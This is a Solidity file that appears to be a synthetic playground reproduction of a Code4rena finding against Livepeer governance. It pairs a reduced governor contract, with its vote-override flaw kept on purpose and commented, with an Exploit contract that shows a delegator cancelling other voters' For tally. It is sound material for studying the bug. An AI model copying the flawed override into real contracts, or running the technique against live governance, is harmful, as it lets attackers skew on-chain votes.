// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Livepeer — By delegating to a non-transcoder, a delegator can reduce the
    tally of someone else's vote choice without first granting them any voting
    power (Code4rena 2023-08, [H-02], #27048)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: _handleVotesOverrides subtracts the delegator's weight from the
    delegate's prior vote tally whenever the delegate hasVoted — but does NOT
    check that the delegate is a transcoder. Non-transcoders never received the
    delegated weight in getVotes, so the subtraction removes weight that was
    never added — Bob can cancel other voters' For tally and vote Against himself.

    Scenario (checked math, report economics):
      - Carol (honest) votes For with 5000
      - Alice (non-transcoder, 100) votes For → For = 5100
      - Bob bonds 1000 delegated to Alice, votes Against
      - Override subtracts 1000 from For (Alice never held that weight) → For = 4100
      - Bob adds 1000 Against
      Correct world: For=5100, Against=1000. Actual: For=4100, Against=1000.
      Bob cancelled 1000 of OTHER people's For votes — double influence.
//////////////////////////////////////////////////////////////////////////*/

enum VoteType {
    Against,
    For,
    Abstain
}

/// @notice Reduced bonding + governor preserving the non-transcoder override bug.
contract BondingVotesGovernor {
    struct Bond {
        uint256 bondedAmount;
        uint256 delegatedAmount;
        address delegateAddress;
    }

    struct Voter {
        bool hasVoted;
        VoteType support;
    }

    struct ProposalTally {
        uint256 againstVotes;
        uint256 forVotes;
        uint256 abstainVotes;
    }

    mapping(address => Bond) public bonds;
    mapping(address => bool) public isTranscoder;
    mapping(uint256 => mapping(address => Voter)) public proposalVoters;
    mapping(uint256 => ProposalTally) public tallies;

    /*//////////////// getVotes (VERBATIM logic from the finding) ////////////////*/
    function getVotes(address account) public view returns (uint256 amount) {
        Bond memory bond = bonds[account];
        if (bond.bondedAmount == 0) {
            amount = 0;
        } else if (isTranscoder[account]) {
            amount = bond.delegatedAmount;
        } else {
            amount = bond.bondedAmount; // non-transcoder: own stake only
        }
    }

    function bond(address account, uint256 amount, address delegatee) external {
        Bond storage b = bonds[account];
        b.bondedAmount += amount;
        b.delegateAddress = delegatee;
        bonds[delegatee].delegatedAmount += amount;
        if (account == delegatee) {
            isTranscoder[account] = true;
        }
    }

    function demoteTranscoder(address account) external {
        isTranscoder[account] = false;
    }

    function castVote(uint256 proposalId, address voter, VoteType support) external {
        require(!proposalVoters[proposalId][voter].hasVoted, "already voted");
        uint256 weight = getVotes(voter);
        require(weight > 0, "no weight");

        _handleVotesOverrides(proposalId, voter, weight);

        proposalVoters[proposalId][voter] = Voter({hasVoted: true, support: support});
        ProposalTally storage tally = tallies[proposalId];
        if (support == VoteType.Against) {
            tally.againstVotes += weight;
        } else if (support == VoteType.For) {
            tally.forVotes += weight;
        } else {
            tally.abstainVotes += weight;
        }
    }

    /// @dev VERBATIM vulnerable override — missing "delegate is transcoder" check.
    function _handleVotesOverrides(uint256 proposalId, address voter, uint256 _weight) internal {
        Bond memory bond = bonds[voter];
        address delegatee = bond.delegateAddress;

        // Self-delegating transcoder: no override of someone else
        bool voterIsTranscoder = (delegatee == voter) && isTranscoder[voter];
        if (voterIsTranscoder) {
            return;
        }

        Voter memory delegateVoter = proposalVoters[proposalId][delegatee];
        // BUG: only checks hasVoted — does NOT require delegatee is a transcoder
        if (delegateVoter.hasVoted) {
            // this is a delegator overriding its delegated transcoder vote,
            // we need to update the current totals to move the weight of
            // the delegator vote to the right outcome.
            VoteType delegateSupport = delegateVoter.support;
            ProposalTally storage _tally = tallies[proposalId];

            if (delegateSupport == VoteType.Against) {
                _tally.againstVotes -= _weight;
            } else if (delegateSupport == VoteType.For) {
                _tally.forVotes -= _weight; // @> VULN: subtracts from non-transcoder tally that never included _weight
            } else {
                assert(delegateSupport == VoteType.Abstain);
                _tally.abstainVotes -= _weight;
            }
        }
        // FIX: if (delegateVoter.hasVoted && isTranscoder[delegatee]) { ... }
    }
}

/// @notice Carol For 5000 + Alice (non-transcoder) For 100 → For=5100.
///         Bob (1000 to Alice) votes Against → For wrongly drops by 1000 to 4100,
///         Against=1000. Bob cancelled ungranted weight (double influence).
contract Exploit {
    uint256 public constant PROPOSAL = 1;
    uint256 public constant CAROL_STAKE = 5000;
    uint256 public constant ALICE_STAKE = 100;
    uint256 public constant BOB_STAKE = 1000;

    BondingVotesGovernor public gov;
    address public alice;
    address public carol;
    address public bob;

    uint256 public forAfterAlice;
    uint256 public forAfterBob;
    uint256 public againstAfterBob;

    constructor() {
        gov = new BondingVotesGovernor(); // CREATE 1
        alice = address(0xA11CE);
        carol = address(0xCA201);
        bob = address(this); // attacker

        // Carol: self-bonded transcoder (honest For voter)
        gov.bond(carol, CAROL_STAKE, carol);

        // Alice: bonded as self-delegate then demoted → non-transcoder with 100 votes
        gov.bond(alice, ALICE_STAKE, alice);
        gov.demoteTranscoder(alice);

        // Bob: 1000 bonded, delegated to Alice (non-transcoder)
        gov.bond(bob, BOB_STAKE, alice);
    }

    function run() external {
        // Carol votes For with 5000
        gov.castVote(PROPOSAL, carol, VoteType.For);

        // Alice (non-transcoder) votes For with 100 → For = 5100
        gov.castVote(PROPOSAL, alice, VoteType.For);
        (, forAfterAlice,) = gov.tallies(PROPOSAL);
        require(forAfterAlice == CAROL_STAKE + ALICE_STAKE, "for after alice");

        // Bob votes Against. Missing transcoder check → subtracts 1000 from For
        // (weight Alice never held) then adds 1000 Against.
        gov.castVote(PROPOSAL, bob, VoteType.Against);
        (againstAfterBob, forAfterBob,) = gov.tallies(PROPOSAL);

        // HARM: For lost Bob's weight without ever receiving it; Against gained it.
        // Correct: For=5100, Against=1000. Actual: For=4100, Against=1000.
        require(forAfterBob == forAfterAlice - BOB_STAKE, "for reduced by ungranted weight");
        require(forAfterBob == CAROL_STAKE + ALICE_STAKE - BOB_STAKE, "for = 4100");
        require(againstAfterBob == BOB_STAKE, "against = bob stake");
        // Net swing vs correct world: Bob cancelled 1000 of Carol+Alice For votes
        require(forAfterAlice - forAfterBob == BOB_STAKE, "double influence: cancelled ungranted For");
    }
}
